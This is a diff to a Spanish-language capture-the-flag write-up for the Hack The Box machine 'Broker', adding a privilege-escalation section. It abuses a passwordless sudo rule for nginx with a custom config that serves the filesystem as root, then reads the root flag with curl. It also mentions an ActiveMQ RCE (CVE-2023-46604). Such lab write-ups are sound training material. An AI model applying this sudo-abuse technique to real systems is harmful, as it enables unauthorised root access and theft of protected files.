@@ -17,7 +17,7 @@ nav_order: 1
 **Broker** es una máquina de nivel *Easy* en Hack The Box. El enfoque principal está en identificar puertos expuestos mediante escaneo completo y explotar los servicios visibles.
 
 - SO: Linux  
-- Dificultad: Media  
+- Dificultad: Easy  
 - Herramientas utilizadas: `nmap`
 
 ---
@@ -261,6 +261,93 @@ cat user.txt
 ✅ ¡Primera flag conseguida!  
 Ahora tocaría explorar el sistema, buscar vectores para escalar privilegios y ver si podemos llegar a `root`.
 
-> *(Próxima sección: Escalada de privilegios — stay tuned 😈)*
+## ⬆️ Escalada de privilegios con Nginx (Sudo abuse)
+
+Al revisar los permisos sudo con:
+
+```bash
+sudo -l
+```
+
+Me encontré con una **joya**:
+
+```text
+(ALL : ALL) NOPASSWD: /usr/sbin/nginx
+```
+
+✅ ¡Puedo ejecutar Nginx como root sin contraseña!
+
+![Sudo sin contraseña](/assets/images/broker/14-sudo-nginx.png)
+
+---
+
+### 🧠 Idea: Servir `/root/` vía HTTP
+
+Ya que Nginx puede ser lanzado como root, configuré un archivo `.conf` personalizado para exponer la raíz del sistema a través de un puerto cualquiera.
+
+Escribí el siguiente archivo:
+
+```nginx
+user root;
+events { worker_connections 1024; }
+http {
+  server {
+    listen 1337;
+    root /;
+    autoindex on;
+  }
+}
+```
+
+```bash
+cat <<EOF > /dev/shm/read_root.conf
+(user root; ...)
+EOF
+```
+
+![Creando archivo de configuración](/assets/images/broker/15-write-nginx-conf.png)
+
+---
+
+### 🚀 Lanzando Nginx como root
+
+```bash
+sudo /usr/sbin/nginx -c /dev/shm/read_root.conf
+```
+
+Esto inició Nginx con nuestra configuración y nos permitió acceder a `/root/` desde `localhost:1337`.
+
+![Ejecutando Nginx](/assets/images/broker/16-launch-nginx.png)
+
+---
+
+## 🏁 Flag de root
+
+Usando `curl`, simplemente accedí a la flag de root:
+
+```bash
+curl http://localhost:1337/root/root.txt
+```
+
+![Obteniendo flag de root](/assets/images/broker/17-root-flag.png)
+
+🎉 **¡Máquina completada con éxito!**
+
+---
+
+## ✅ Resumen final
+
+| Acción | Resultado |
+|--------|-----------|
+| Enumeración | Identificación de ActiveMQ y panel |
+| Explotación | CVE-2023-46604 RCE |
+| Acceso | Usuario `activemq` |
+| Escalada | Sudo abuse con Nginx |
+| Flags | `user.txt`, `root.txt` ✔️ |
+
+---
+
+**Autor:** [gueco99](https://github.com/gueco99)  
+🧠 Hack the Box – *Broker* (Easy)
 
 
